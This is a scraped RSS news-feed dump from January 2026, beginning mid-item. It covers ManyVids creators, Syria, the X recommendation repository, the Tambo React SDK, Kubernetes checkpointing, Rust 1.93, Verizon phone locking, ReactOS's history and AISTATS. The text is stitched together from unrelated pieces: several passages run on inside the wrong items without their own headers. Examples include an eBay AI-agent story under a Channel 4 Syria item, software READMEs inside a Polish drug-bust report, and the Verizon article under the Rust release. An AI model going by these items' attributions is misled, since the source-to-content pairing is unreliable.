site. “To the point that as much as I'm extremely disappointed with many of the recent changes occurring, I won’t be deleting my account as to not lose that income and disappoint my ManyVids fans.” Others are done. Sydney Screams said she’s no longer uploading to ManyVids and made the decision to slowly start removing content from her stores there. “Platforms that allow for online sex work should be working FOR us, not against us. Sex workers use platforms like MV to earn our own living, to enable ourselves to have better lives, to keep ourselves housed and fed, to pay for medical bills, etc. Many of us choose this life and choose to make this our career, though there are far too many who are survival sex workers,” Screams said. “We aren't looking for a pathway out of the adult industry, especially on a platform that is a porn platform!!! Unless MV is going to start funding the educations & trainings of those trying to leave the industry for work elsewhere, I do not see how a porn platform is going to create a path out of the industry.” Emanuel Maiberg contributed reporting to this story.]]></content:encoded></item><item><title>Will ISIS return after Syrian forces push Kurds back?</title><link>https://www.channel4.com/news/will-isis-return-after-syrian-forces-push-kurds-back</link><author>Channel 4 News</author><category>news</category><pubDate>Thu, 22 Jan 2026 16:04:07 +0000</pubDate><source url="https://www.channel4.com/news">Channel 4</source><content:encoded><![CDATA[It was hoped the fall of Syria’s former dictator Bashar al-Assad would usher in a period of stability, unity and perhaps – eventually – democracy.
But now the country enters a new and unpredictable phase as President Ahmed Al-Sharaa tightens his grip on power.In the north-east of the country the Kurds were the West’s key ally against Islamic State.Now their control in the region is collapsing after days of fierce battles with government forces. A tentative ceasefire is in place but the fallout is far from clear, including the fate of thousands of ISIS prisoners and their families who were in Kurdish-controlled camps.Regional powers like Turkey and Iran, as well as China, Russia and the West are also jostling for influence.Could these developments finally bring a period of calm and stability in Syria or just open the door to new dangers?

On its face, a one-line terms of service update doesn't seem like major news, but what it implies is more significant: The change reflects the rapid emergence of what some are calling "agentic commerce," a new category of AI tools designed to browse, compare, and purchase products on behalf of users.eBay's updated terms, which go into effect on February 20, 2026, specifically prohibit users from employing "buy-for-me agents, LLM-driven bots, or any end-to-end flow that attempts to place orders without human review" to access eBay's services without the site's permission. The previous version of the agreement contained a general prohibition on robots, spiders, scrapers, and automated data gathering tools but did not mention AI agents or LLMs by name.At first glance, the phrase "agentic commerce" may sound like aspirational marketing jargon, but the tools are already here, and people are apparently using them. While fitting loosely under one label, these tools come in many forms.]]></content:encoded></item><item><title>Why I Still Write Code as an Engineering Manager</title><link>https://terriblesoftware.org/2026/01/22/why-i-still-write-code-as-an-engineering-manager/</link><author>/u/Acceptable-Courage-9</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 15:50:33 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[I still code on my team. Not every day, and almost never on critical path work, but regularly enough that I know what our codebase actually looks like. The parts that are a joy to work in and the parts that aren’t.Why not critical path? Because that’s not my job anymore. Taking the interesting, high-visibility work from your team is a fast way to breed resentment and stunt their growth. But there’s plenty of other work: small bugs, minor improvements, tooling fixes, documentation that requires code understanding. The stuff that matters but isn’t going to make or break the quarter.So why bother? A few reasons.But the most important reason is this: I get to show my team what good work looks like.Andy Grove, in High Output Management, talks about how a manager’s job is to increase the output of their team. One of the most effective ways to do this is through training. Training isn’t slides, though, but showing your people what good work is in practice.When I write code, I’m setting a standard. How do I structure a PR? How do I write commit messages? How thorough are my tests? How do I handle code review feedback? How do I communicate when I’m uncertain about something? My team sees all of this.Showing beats telling. When you’re doing the work alongside your team, not dictating from above, it lands differently. They see you’re not asking them to do anything you wouldn’t do yourself. And because they can observe how you work directly, they can adopt what works and adapt it to their own style.This connects to something Nassim Taleb (one of my heroes) calls skin in the game: you make better decisions when you personally bear the consequences of those decisions.When I commit code that goes to production, I feel what my team feels. I deal with the same flaky tests, the same deployment process, the same frustrating parts of our developer experience. I can’t wave my hand and say “just fix it” because I know exactly how hard that fix actually is. I’ve tried it myself.When I’m pushing back on a deadline, I know the trade-offs because I’ve lived them. When I’m advocating for time to pay down tech debt, I can point to specific pain I’ve personally experienced. My team knows I’m not asking them to do things I don’t understand.Look, I’m not going to pretend I know your situation. Maybe you’re managing fifteen people and there’s genuinely no time. Maybe your company has a strict policy against it. Maybe you’ve moved so far into strategy that coding would actually be a distraction from higher-leverage work. Context matters.But if you’ve stopped coding entirely, ask yourself why. Is it because you genuinely can’t, or because you’ve convinced yourself you shouldn’t? “I’m a manager now so I don’t do that anymore” isn’t an answer.Staying technical doesn’t mean being the top contributor, but maintaining enough connection to the work that you can make informed decisions, earn your team’s respect, and remember what it actually feels like to ship software. The frustration and the satisfaction, the parts that look easy but aren’t, the parts that look hard but turn out to be trivial.That feeling is what your team experiences every day. And if you’ve completely forgotten what that’s like, it gets harder to truly connect with the people doing that work.]]></content:encoded></item><item><title>Poland leads EU’s biggest ever synthetic drugs bust</title><link>https://notesfrompoland.com/2026/01/22/poland-leads-eus-biggest-ever-synthetic-drugs-bust/</link><author>Alicja Ptak</author><category>news</category><pubDate>Thu, 22 Jan 2026 15:47:43 +0000</pubDate><source url="https://notesfrompoland.com/">News - Poland</source><content:encoded><![CDATA[Keep our news free from ads and paywalls by making a donation to support our work!Notes from Poland is run by a small editorial team and is published by an independent, non-profit foundation that is funded through donations from our readers. We cannot do what we do without your support.Poland has played a leading role in the European Union’s largest-ever operation against synthetic drugs. Police in six countries dismantled 24 industrial-scale laboratories, seized tonnes of drugs, and arrested dozens of suspects, including the alleged ringleaders of the network in Poland.The operation, named Fabryka (meaning “factory” in Polish), was announced on Wednesday by Europol, the EU’s law-enforcement agency, which coordinated the action across Spain, Belgium, the Netherlands, Germany, the Czech Republic and Poland itself.It culminated in a series of raids that took place last Friday and saw 20 people arrested, 19 of them in Poland. Overall, 85 people were arrested during the course of the operation.Officers seized over 3.5 tonnes and 982 litres of drugs (including 4-CMC, cathinone, MDMA, and amphetamine oil) as well as 1,000 tonnes of chemical precursors, which could have been used to produce 300 tonnes of synthetic drugs.Europol estimates that the illegal activities could have generated billions of euros in profits for the criminal networks involved.The investigation began in 2022 when police in Wrocław, Poland’s third largest city, started examining the import and sale of chemicals used to produce drugs, the Polish interior ministry said.The probe later expanded across Poland and, from late 2024, Europol coordinated the international operation. Investigators found that the group used legally registered companies to import chemicals from China and India, officially for pharmaceutical use.Among those detained in Poland, a court has placed four alleged ringleaders in pretrial detention for three months, while other suspects were released on bail under police supervision.Prosecutors have charged them with offences including organised crime, large-scale drug production and money laundering. If convicted, they could face up to 20 years in prison, reports broadcaster TVN24.This is not the first time Polish authorities have targeted synthetic drug production: in September 2024, they carried out a major operation with Ukrainian police that dismantled 38 laboratories.That operation was also described as “unprecedented” at the time by Europol, which said that the 195 kilograms of methadone seized alone “could kill almost 4 million people”.Poland itself has also seen rising use of fentanyl, a synthetic opioid. In response, the country’s health ministry introduced a monitoring system for opioid prescriptions earlier in 2024 to curb abuse and prevent overdoses.

Your agent continues to run as usual; you can still use any agent framework you like; you drop in the lightweight  helper, or let the tracer collect every prompt, tool call, and reward. Those events become structured spans that flow into the LightningStore, a central hub that keeps tasks, resources, and traces in sync.On the other side of the store sits the algorithm you choose, or write yourself. The algorithm reads spans, learns from them, and posts updated resources such as refined prompt templates or new policy weights. The Trainer ties it all together: it streams datasets to runners, ferries resources between the store and the algorithm, and updates the inference engine when improvements land. You can either stop there, or simply let the same loop keep turning.No rewrites, no lock-in, just a clear path from first rollout to steady improvement.If you find Agent Lightning useful in your research or projects, please cite our paper:@misc{luo2025agentlightningtrainai,

PageIndex performs retrieval in two steps:Generate a “Table-of-Contents”  of documentsPerform reasoning-based retrieval through Compared to traditional vector-based RAG,  features:: Uses document structure and LLM reasoning for retrieval, instead of vector similarity search.: Documents are organized into natural sections, not artificial chunks.: Simulates how human experts navigate and extract knowledge from complex documents.Better Explainability and Traceability: Retrieval is based on reasoning — traceable and interpretable, with page and section references. No more opaque, approximate vector search (“vibe retrieval”).PageIndex powers a reasoning-based RAG system that achieved 98.7% accuracy on FinanceBench, demonstrating superior performance over vector-based RAG solutions in professional document analysis (see our blog post for details).The PageIndex service is available as a ChatGPT-style chat platform, or can be integrated via MCP or API.Self-host — run locally with this open-source repo.Try the  notebook — a , hands-on example of reasoning-based RAG using PageIndex.PageIndex can transform lengthy PDF documents into a semantic , similar to a  but optimized for use with Large Language Models (LLMs).

For an introduction to how the algorithm works, please refer to our engineering blog.Product surfaces at X are built on a shared set of data, models, and software frameworks. The shared components included in this repository are listed below:Core service that handles the reading and writing of post data.Centralized platform to retrieve explicit (e.g. likes, replies) and implicit (e.g. profile visits, tweet clicks) user signals.Community detection and sparse embeddings into those communities.Dense knowledge graph embeddings for Users and Posts.Model to predict the likelihood of an X User interacting with another User.Page-Rank algorithm for calculating X User reputation.Serves graph features for a directed pair of users (e.g. how many of User A's following liked posts from User B).Compute scores between pairs of entities (Users, Posts, etc.) using embedding similarity.High performance, machine learning model serving written in Rust.Legacy machine learning framework built on TensorFlow v1.The product surfaces currently included in this repository are the For You Timeline and Recommended Notifications.The diagram below illustrates how major services and jobs interconnect to construct a For You Timeline.The core components of the For You Timeline included in this repository are listed below:Find and rank In-Network posts. ~50% of posts come from this candidate source.Coordination layer for fetching Out-of-Network tweet candidates from underlying compute services.Maintains an in memory User to Post interaction graph, and finds candidates based on traversals of this graph. This is built on the GraphJet framework. Several other GraphJet based features and candidate sources are located here.Light Ranker model used by search index (Earlybird) to rank posts.Neural network for ranking candidate posts. One of the main signals used to select timeline posts post candidate sourcing.Main service used to construct and serve the Home Timeline. Built on product-mixer.Responsible for filtering X content to support legal compliance, improve product quality, increase user trust, protect revenue through the use of hard-filtering, visible product treatments, and coarse-grained downranking.Legacy service which provides relevance-scored posts from the Earlybird Search Index and UTEG service.Recommended NotificationsThe core components of Recommended Notifications included in this repository are listed below:Main recommendation service at X used to surface recommendations to our users via notifications.Light Ranker model used by pushservice to rank posts. Bridges candidate generation and heavy ranking by pre-selecting highly-relevant candidates from the initial huge candidate pool.Multi-task learning model to predict the probabilities that the target users will open and engage with the sent notifications.We include Bazel BUILD files for most components, but not a top-level BUILD or WORKSPACE file. We plan to add a more complete build and test system in the future.We invite the community to submit GitHub issues and pull requests for suggestions on improving the recommendation algorithm. We are working on tools to manage these suggestions and sync changes to our internal repository. Any security concerns or issues should be routed to our official bug bounty program through HackerOne. We hope to benefit from the collective intelligence and expertise of the global community in helping us identify issues and suggest improvements, ultimately leading to a better X.Read our blog on the open source initiative here.]]></content:encoded></item><item><title>tambo-ai/tambo</title><link>https://github.com/tambo-ai/tambo</link><author></author><pubDate>Thu, 22 Jan 2026 15:11:35 +0000</pubDate><source url="http://mshibanami.github.io/GitHubTrendingRSS">Github Trending</source><content:encoded><![CDATA[Generative UI SDK for ReactBuild apps that adapt to your users.Tambo is a generative UI SDK for React. Register your components, and the AI decides which ones to render based on natural language conversations.Most software is built around a one-size-fits-all mental model that doesn't fit every user.Users shouldn't have to learn your app. Generative UI shows the right components based on what someone is trying to do. First-time users and power users see different things.Users shouldn't have to click through your workflows. "Show me sales from last quarter grouped by region" should just work. The AI translates what users want into the right interface.const components: TamboComponent[] = [{
  name: "Graph",
  description: "Displays data as charts",
  component: Graph,
  propsSchema: z.object({ data: z.array(...), type: z.enum(["line", "bar", "pie"]) })
}];

npm run dev
 is a free hosted backend.  runs on your own infrastructure.Tambo supports two kinds of components. render once in response to a message. Charts, summaries, data visualizations. persist and update as users refine requests. Shopping carts, spreadsheets, task boards.Tell the AI which components it can use. Zod schemas define the props.// Generative: AI creates on-demand
const components: TamboComponent[] = [
  {
    name: "Graph",
    description: "Displays data as charts using Recharts library",
    component: Graph,
    propsSchema: z.object({
      data: z.array(z.object({ name: z.string(), value: z.number() })),
      type: z.enum(["line", "bar", "pie"]),
    }),
  },
];

// Interactable: persists and updates by ID
const InteractableNote = withInteractable(Note, {
  componentName: "Note",
  description: "A note supporting title, content, and color modifications",
  propsSchema: z.object({
    title: z.string(),
    content: z.string(),
    color: z.enum(["white", "yellow", "blue", "green"]).optional(),
  }),
});
Wrap your app with .<TamboProvider
  apiKey={process.env.NEXT_PUBLIC_TAMBO_API_KEY!}
  components={components}
>
  <Chat />
  <InteractableNote id="note-1" title="My Note" content="Start writing..." />
</TamboProvider>
For apps with signed-in users, pass a per-user  (OAuth access token) to  to enable per-user auth and connect Tambo to your app's end-user identity. See User Authentication for details.Send messages with .  handles streaming, including props for generated components and tool calls.const { value, setValue, submit, isPending } = useTamboThreadInput();

<input value={value} onChange={(e) => setValue(e.target.value)} />

Track streaming status if you want progressive loading:const { streamStatus, propStatus } = useTamboStreamStatus();

if (!streamStatus.isSuccess) return <Spinner />;
{
  propStatus["title"]?.isSuccess && <h3>{title}</h3>;
}
Connect to Linear, Slack, databases, or your own MCP servers. Tambo supports the full MCP protocol: tools, prompts, elicitations, and sampling.import { MCPTransport } from "@tambo-ai/react/mcp";

const mcpServers = [

Supports the full MCP protocol: tools, prompts, elicitations, and sampling.Sometimes you need functions that run in the browser. DOM manipulation, authenticated fetches, accessing React state. Define them as tools and the AI can call them.const tools: TamboTool[] = [
  {
    name: "getWeather",
    description: "Fetches weather for a location",
    tool: async (location: string) =>
      fetch(`/api/weather?q=${encodeURIComponent(location)}`).then((r) =>
        r.json(),
      ),
    toolSchema: z
      .function()
      .args(z.string())
      .returns(
        z.object({
          temperature: z.number(),
          condition: z.string(),

        }),
      ),
  },
];

<TamboProvider tools={tools} components={components}>
  <App />

Each lesson includes pre-lesson and post-lesson quizzes, written instructions to complete the lesson, a solution, and an assignment. Our project-based pedagogy allows you to learn while building, a proven way for new skills to 'stick'.Supported via GitHub Action (Automated & Always Up-to-Date)This repository includes 50+ language translations which significantly increases the download size. To clone without translations, use sparse checkout:git clone --filter=blob:none --sparse https://github.com/microsoft/Data-Science-For-Beginners.git
cd Data-Science-For-Beginners
git sparse-checkout set --no-cone '/*' '!translations' '!translated_images'
This gives you everything you need to complete the course with a much faster download.If you wish to have additional translations languages supported are listed hereWe have a Discord learn with AI series ongoing, learn more and join us at Learn with AI Series from 18 - 30 September, 2025. You will get tips and tricks of using GitHub Copilot for Data Science.Get started with the following resources:Student Hub page In this page, you will find beginner resources, Student packs and even ways to get a free cert voucher. This is one page you want to bookmark and check from time to time as we switch out content at least monthly.: New to data science? Start with our beginner-friendly examples! These simple, well-commented examples will help you understand the basics before diving into the full curriculum. : to use this curriculum on your own, fork the entire repo and complete the exercises on your own, starting with a pre-lecture quiz. Then read the lecture and complete the rest of the activities. Try to create the projects by comprehending the lessons rather than copying the solution code; however, that code is available in the /solutions folders in each project-oriented lesson. Another idea would be to form a study group with friends and go through the content together. For further study, we recommend Microsoft Learn.🎥 Click the image above for a video about the project the folks who created it!We have chosen two pedagogical tenets while building this curriculum: ensuring that it is project-based and that it includes frequent quizzes. By the end of this series, students will have learned basic principles of data science, including ethical concepts, data preparation, different ways of working with data, data visualization, data analysis, real-world use cases of data science, and more.In addition, a low-stakes quiz before a class sets the intention of the student towards learning a topic, while a second quiz after class ensures further retention. This curriculum was designed to be flexible and fun and can be taken in whole or in part. The projects start small and become increasingly complex by the end of the 10 week cycle.Optional supplemental videoFor project-based lessons, step-by-step guides on how to build the project: All quizzes are contained in the Quiz-App folder, for 40 total quizzes of three questions each. They are linked from within the lessons, but the quiz app can be run locally or deployed to Azure; follow the instruction in the  folder. They are gradually being localized.🎓 Beginner-Friendly Examples We've created a special examples directory with simple, well-commented code to help you get started:🌟  - Your first data science program📂  - Learn to read and explore datasets📊  - Calculate statistics and find patterns📈  - Create charts and graphs🔬  - Complete workflow from start to finishEach example includes detailed comments explaining every step, making it perfect for absolute beginners!Learn the basic concepts behind data science and how it’s related to artificial intelligence, machine learning, and big data.Introduction to Statistics & ProbabilityThe mathematical techniques of probability and statistics to understand data.Working with Relational DataIntroduction to relational data and the basics of exploring and analyzing relational data with the Structured Query Language, also known as SQL (pronounced “see-quell”).Introduction to non-relational data, its various types and the basics of exploring and analyzing document databases.Basics of using Python for data exploration with libraries such as Pandas.

O lado do C não lida com concorrência de jeito nenhum, então se duas goroutines tentarem executar qualquer uma dessas funções ao mesmo tempo, o programa quebra. É como um motor V12: enquanto um pistão sobe, o outro desce; a sincronização precisa ser perfeita.O volume de chamadas é altíssimo. Tenho dezenas ou centenas de goroutines chamando essas funções constantemente. O ciclo de "lock e unlock" é extremamente rápido e frequente. Atualmente, uso um sync.Mutex global para garantir que apenas uma goroutine por vez acesse o CGO.Vale a pena trocar esse Mutex por um padrão de Worker com Channels? Eu sei que canais são a forma "Go" de fazer as coisas, mas como as goroutines precisam do retorno da função (sucesso/erro e dados), o modelo de canal exigiria que eu enviasse um "request" com um canal de resposta dentro, o que me parece gerar mais overhead de alocação que um simples Mutex.]]></content:encoded></item><item><title>Announcing the Checkpoint/Restore Working Group</title><link>https://kubernetes.io/blog/2026/01/21/introducing-checkpoint-restore-wg/</link><author>/u/dshurupov</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 14:21:55 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Kubernetes</source><content:encoded><![CDATA[The community around Kubernetes includes a number of Special Interest Groups (SIGs) and Working Groups (WGs) facilitating discussions on important topics between interested contributors. Today we would like to announce the new Kubernetes Checkpoint Restore WG focusing on the integration of Checkpoint/Restore functionality into Kubernetes.There are several high-level scenarios discussed in the working group:Optimizing resource utilization for interactive workloads, such as Jupyter notebooks and AI chatbotsAccelerating startup of applications with long initialization times, including Java applications and LLM inference servicesUsing periodic checkpointing to enable fault-tolerance for long-running workloads, such as distributed model trainingProviding interruption-aware scheduling with transparent checkpoint/restore, allowing lower-priority Pods to be preempted while preserving the runtime state of applicationsFacilitating Pod migration across nodes for load balancing and maintenance, without disrupting workloads.Enabling forensic checkpointing to investigate and analyze security incidents such as cyberattacks, data breaches, and unauthorized access.Across these scenarios, the goal is to help facilitate discussions of ideas between the Kubernetes community and the growing Checkpoint/Restore in Userspace (CRIU) ecosystem. The CRIU community includes several projects that support these use cases, including:CRIU - A tool for checkpointing and restoring running applications and containerscheckpointctl - A tool for in-depth analysis of container checkpointscriu-coordinator - A tool for coordinated checkpoint/restore of distributed applications with CRIUMore information about the checkpoint/restore integration with Kubernetes is also available here.If you are interested in contributing to Kubernetes or CRIU, there are several ways to participate:]]></content:encoded></item><item><title>Rust 1.93 Brings Improvement For Inline Assembly Handling</title><link>https://www.phoronix.com/news/Rust-1.93-Released</link><author>Michael Larabel</author><category>tech</category><pubDate>Thu, 22 Jan 2026 14:18:12 +0000</pubDate><source url="https://www.phoronix.com/">Phoronix</source><content:encoded><![CDATA[Rust 1.93 is out today as the first feature release for this programming lanugage of 2026...]]></content:encoded></item><item><title>Show HN: I&apos;ve been using AI to analyze every supplement on the market</title><link>https://pillser.com/</link><author>lilouartz</author><category>hn</category><pubDate>Thu, 22 Jan 2026 14:09:29 +0000</pubDate><source url="https://news.ycombinator.com/shownew">HN Show</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Rust 1.93.0 is out</title><link>https://blog.rust-lang.org/2026/01/22/Rust-1.93.0/</link><author>/u/manpacket</author><category>rust</category><category>reddit</category><pubDate>Thu, 22 Jan 2026 14:04:09 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=3">Reddit - Rust</source><content:encoded><![CDATA[The Rust team is happy to announce a new version of Rust, 1.93.0.

The rules, applied via spectrum acquisition and merger conditions, required that Verizon unlock your phone within 60 days after purchase so you could easily switch to competitors.Verizon, as we’ve long established, hates competition, and immediately got to work lobbying the Trump administration to destroy the rules. The pay-to-play Trump administration quickly agreed, and now Verizon has started telling wireless customers they have to wait a year before switching phones after purchasing one from Verizon:“Verizon was previously required to unlock phones automatically after 60 days due to restrictions imposed on its spectrum licenses and merger conditions that helped Verizon obtain approval of its purchase of TracFone. But an update applied today to the TracFone unlocking policy said new phones will be locked for at least a year and that each customer will have to request an unlock instead of getting it automatically.”Again, these conditions were broadly popular and served the public interest, ensuring that it was easier for consumers to switch between our ever-consolidating, anti-competitive wireless phone giants. Verizon lobbied the FCC by repeatedly lying, without evidence, that these conditions resulted in a wave of black market phone thefts. FCC boss Brendan Carr, ever the industry lackey, parroted the claims in his rulings.To be clear this is, for now, only something Verizon is doing via its prepaid sub-brands that include Straight Talk, Tracfone, Net10 Wireless, Clearway, Total Wireless, Simple Mobile, SafeLink Wireless, and Walmart Family Mobile. These brands often attract lower income customers who can least afford to be trapped under an expensive provider like this.You can, for now, still buy an unlocked phone from an independent retailer, bring it to Verizon’s main postpaid brands, and port it back out again if you’d like. But when Verizon sees limited Democrat and press backlash  to this first push (guaranteed with so much else going on), it will steadily keep expanding its restrictions to include its primary brands and all unlocked phones.I know this because I’ve covered this company for a quarter century and this company’s anti-competitive ambitions are as predictable as the tides.Ideally, Verizon wants to return to what it considers the golden era of cellular phones: circa 2007 or so when carriers restricted how you could use your phone and restricted what apps you could install (remember all the shitty VCast Verizon apps they wouldn’t let you uninstall? Or the way they’d block phone GPS hardware from working on third-party apps?). Back then, they would also tether you to one carrier via expensive long-term contracts with costly early termination fees.If we stay on this path of zero U.S. corporate oversight, it’s all coming back, sooner or later. From there, should U.S. governance remain under corrupt authoritarian dominance, it’s only a matter of time before Verizon tries to dictate what content you can see in collaboration with the kakistocracy, thanks to the Trump administration’s destruction of popular net neutrality protections. This has always been Verizon’s ambition as a lumbering telecom giant that can’t innovate and hates competition and government oversight. Thanks to Trump’s assault on regulators, it’s increasingly difficult to hold companies like AT&T and Verizon accountable for literally anything (see the 5th Circuit’s decision to let AT&T off the hook for lying to, and spying on, its users). And the Trump administration’s ongoing quest to rubber stamp every merger that comes across its desk means more consolidation, and ultimately higher prices for U.S. wireless consumers who already pay some of the highest prices for mobile data in the developed world.Verizon and other broadly despised telecoms have struck a generational blow against oversight and consumer protection across Trump’s two terms, and they intend to take full advantage of a presidency they helped purchase. All while the president informs his loyal rubes he’s a champion of affordability.]]></content:encoded></item><item><title>I made a documentary about Open Source in Ukraine and around the world</title><link>https://www.reddit.com/r/linux/comments/1qjujym/i_made_a_documentary_about_open_source_in_ukraine/</link><author>/u/whit537</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 13:29:51 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>30 years of ReactOS</title><link>https://reactos.org/blogs/30yrs-of-ros/</link><author>/u/anh0516</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 13:29:05 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[Happy Birthday ReactOS! Today marks 30 years since the first commit to the ReactOS source tree.
It’s been such a long journey that many of our contributors today, including myself, were not alive during this event.
Yet our mission to deliver “your favorite Windows apps and drivers in an open-source environment you can trust” continues to bring people together.
Let’s take a brief look at some of the high and low points throughout our history.1996-2003: The Painful Road to ReactOS 0.1.0ReactOS started from the ashes of the FreeWin95 project, which aimed to provide a free and open-source clone of Windows 95.
FreeWin95 suffered from analysis paralysis, attempting to plan the whole system before writing any code.
Tired of the lack of progress on the project, Jason Filby took the reins as project coordinator and led a new effort targeting Windows NT.
The project was renamed to “ReactOS” as it was a reaction to Microsoft’s monopolistic position in home computer operating systems.Progress on ReactOS was very slow at first.
Contributors had to first build a very basic NT-like kernel before they could develop drivers for it, then continue developing the kernel; not too dissimilar to the process of bootstrapping a new programming language.
Once a few basic drivers were written, other contributors were able to learn from these examples and develop other drivers.While writing this article, I reached out to Eric Kohl. He developed the original storage driver stack for ReactOS (atapi, scsiport, class2, disk, cdrom, cdfs) and has been with the project since 1998. I asked him about his experiences with ReactOS during this time, how he found the project, and what contributing to ReactOS was like during those early days. He wrote:I think I found ReactOS while searching for example code for my contributions to the WINE project.
I subscribed to the mailing list and followed the discussions for a few days.
The developers were discussing the future of shell.exe, a little command line interpreter that could only change drives and directories and execute programs.
A few days [later] I had started to convert the FreeDOS command.com into a Win32 console application, because I wanted to extend it to make it 4DOS compatible.
4DOS was a very powerful command line interpreter.
On December 4th, 1998 I introduced myself and suggested to use my converted FreeDOS command.com as the future ReactOS cmd.exe.
I had a little conversation with Jason Filby and Rex Joliff, the CVS repository maintainer.
I sent my cmd.exe code to Rex and he applied it to the repository.
After applying a few more cmd-related patches over the next weeks, Rex asked me whether I would like to have write-access to the repository.
I accepted the offer…The first version I downloaded and used was 0.0.8.
It was not much more than a DOS-based bootloader, some drivers, and a basic kernel that ran a few test routines after initialization.Version 0.0.8 didn’t use PE files, but flat (position independent) binaries.
There was no PE loader,  no smss, no csrss, no winlogon, no process heaps, no process environments, no threads, etc.
Each and every little feature was a milestone.Initially there was not a review process at all.
You write some code, test it and fix it until it works.
Then you commit it.
If something failed on another machine, you got a reply on the mailing list and discussed a solution.
You fixed the issue and committed a fix.
That’s how it worked.There was always an open and friendly atmosphere.
It was and still is always nice to talk to other developers.
No fights, no wars, like in some other projects.Editors note: minor errors were corrected.ReactOS 0.1.0 was released on February 1st, 2003 and received minor updates up until November 2003.
ReactOS 0.1.0 was the first version of ReactOS that could boot from a CD.
It had a command line interface and no desktop.
Watch a demo of it below, provided courtesy of archeYR.During this period ReactOS saw rapid development.
New drivers were being built all the time, a basic desktop was built, and ReactOS became increasingly stable and usable.
Public interest grew as ReactOS matured.
In October 2005, Jason Filby stepped down as project coordinator, and Steven Edwards was voted to be the next project coordinator.ReactOS 0.2.x boot screenReactOS 0.2.x desktop and file explorerReactOS 0.2.0 with VMware video driver for NT 4It wasn’t all sunshine and rainbows though.
In January 2006, concerns grew about contributors having access to leaked Windows source code and possibly using this leaked source code in their contributions.
In response, Steven Edwards strengthened the project’s intellectual property policy and the project made the difficult decision to audit the existing source code and temporarily freeze contributions.The ongoing audit and contribution freeze from the end of the ReactOS 0.2.x era slowed development and momentum considerably for ReactOS 0.3.x.
Following challenges with the audit, Steven Edwards stepped down as project coordinator and Aleksey Bragin assumed the role by August 2006.Despite the challenges during this time, ReactOS 0.3.x continued to build upon ReactOS’s legacy.
ReactOS 0.3.0 was released on August 28th, 2006.
It introduced networking support and a package manager called “Download!”.
This package manager would become the basis for RAPPS, the package manager built into modern versions of ReactOS.
In July 2008, the x86_64 port of ReactOS was started.
One year later, ReactOS 0.3.10 imported the UniATA driver, written by Alexandr Telyatnikov (Alter).
While we run into limitations with the UniATA driver today, UniATA enabled ReactOS to support SATA storage devices and to support partitions greater than 8GB in size.
On February 8th, 2012, ReactOS 0.3.14 supported being built using the MSVC compiler and added visual style support.Download!, the package manager for ReactOS 0.3.x2016-Today: ReactOS 0.4.xReactOS 0.4.0 was released on February 16th, 2016.
It introduced a new graphical shell that utilized more Windows features and was more similar architecturally to Windows Explorer.
ReactOS 0.4.0 also introduced support for kernel debugging using WinDbg when compiled with MSVC.
Being able to use standard Windows tools for kernel debugging has helped us progress considerably.
ReactOS 0.4.0 continued to receive incremental updates every few months up until versions 0.4.14 and 0.4.15 which had years of development updates each.
Today, the x86_64 port of ReactOS is similarly functional to its x86 counterpart, but with no WoW64 subsystem to run x86 apps its usability is limited.A humorous diagram made in 2015 to explain the complexity of Windows ExplorerReactOS 0.4.15 desktop, shown with Luna visual style and large taskbar icons appliedWe’re continuing to move ReactOS forward. Behind the scenes there are several out-of-tree projects in development. Some of these exciting projects include a new build environment for developers (RosBE), a new NTFS driver, a new ATA driver, multi-processor (SMP) support, support for class 3 UEFI systems, kernel and usermode address space layout randomization (ASLR), and support for modern GPU drivers built on WDDM.The future of ReactOS will be written by the people who believe in the mission and are willing to help carry it forward.Note: Statistics were calculated at commit f60b1c9Total unique contributors: 301Total lines of code: 14,929,578]]></content:encoded></item><item><title>[D] AISTATS 2026 Paper Acceptance Result</title><link>https://www.reddit.com/r/MachineLearning/comments/1qjuitb/d_aistats_2026_paper_acceptance_result/</link><author>/u/mathew208</author><category>ai</category><category>reddit</category><pubDate>Thu, 22 Jan 2026 13:28:29 +0000</pubDate><source url="https://www.reddit.com/r/MachineLearning/top/?sort=top&amp;t=day&amp;limit=3">Reddit - ML</source><content:encoded><![CDATA[AISTATS 2026 acceptance decisions are being released today.

DESCRIPTION
Andrew Harmel-Law explores the core concepts of effect oriented programming with authors Bill Frasure, Bruce Eckel, and James Ward. The discussion reveals that effects are composable operations that encapsulate side effects and defer execution, giving developers the right handles to manage unpredictability through compiler-checked types.
The authors explain how ZIO tracks three critical types: outputs, failures, and environmental requirements, enabling better testing with mock clocks and random number generators.

They share their intentional avoidance of intimidating functional programming terminology like "monads" proving you don't need mathematical foundations to understand effects. The conversation covers effect systems' expansion beyond Scala into TypeScript, Kotlin, and new languages like Unison and Roc, and how their collaborative writing process with strict constraints like 47-character line limits - created a coherent 100-page book readable in portrait mode on your phone.

This friend writes to you and your spouse, asking if you can put him up while he's in town. Has this person committed a gross violation of etiquette? Whether you answer yes or no may speak to whether you're an Asker or a Guesser--the two personality types described in a three-year-old Web comment that has lately taken on a second life as a full-on blog meme.On January 16, 2007, Andrea Donderi responded to an Ask MetaFilter post that dealt with a houseguest-related situation like the one described above. Donderi's take on the situation is as elegant as it is provocative. Basically, she says, there are two types of people in the world:This is a classic case of Ask Culture meets Guess Culture. In some families, you grow up with the expectation that it's OK to ask for anything at all, but you gotta realize you might get no for an answer. This is Ask Culture. In Guess Culture, you avoid putting a request into words unless you're pretty sure the answer will be yes. Guess Culture depends on a tight net of shared expectations. A key skill is putting out delicate feelers. If you do this with enough subtlety, you won't even have to make the request directly; you'll get an offer. Even then, the offer may be genuine or pro forma; it takes yet more skill and delicacy to discern whether you should accept.Over the weekend, Oliver Burkeman wrote a column for The Guardian taking up Donderi's dichotomy and asking, "Are you an Asker or a Guesser?" A number of bloggers took the bait, expanding into broader thoughts about the niceties of social etiquette. Here's what they had to say:Contributes to Personal, Professional, 